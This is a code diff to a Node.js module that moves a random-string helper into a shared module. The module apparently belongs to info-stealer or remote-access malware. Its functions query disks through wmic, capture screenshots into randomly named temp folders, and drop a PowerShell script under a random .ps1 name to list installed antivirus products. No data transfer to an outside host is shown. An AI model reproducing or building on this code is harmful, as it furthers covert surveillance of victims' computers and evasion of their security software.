@@ -6,11 +6,6 @@ const os = require('os');
 const hardware = require('./../hardware/hardware.js');
 const program = require('./../program/program.js');
 
-const randString = (length) => {
-    const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-    return Array.from({ length }, () => charset[Math.floor(Math.random() * charset.length)]).join('');
-};
-
 const getPCDisk = async () => {
     try {
         const output = await program.execCommand('wmic logicaldisk get size');
@@ -64,7 +59,7 @@ const getNetwork = async () => {
 };
 
 const getScreenShots = async () => {
-    const dir = path.join(os.tmpdir(), randString(10));
+    const dir = path.join(os.tmpdir(), program.randString(10));
     fs.mkdirSync(dir, { recursive: true });
 
     try {
@@ -198,7 +193,7 @@ const getAntivirus = async () => {
         Get-AntiVirusInfo
     `;
 
-    const tempFile = path.join(os.tmpdir(), `${randString(10)}.ps1`);
+    const tempFile = path.join(os.tmpdir(), `${program.randString(10)}.ps1`);
     fs.writeFileSync(tempFile, powershellScript);
     
     try {
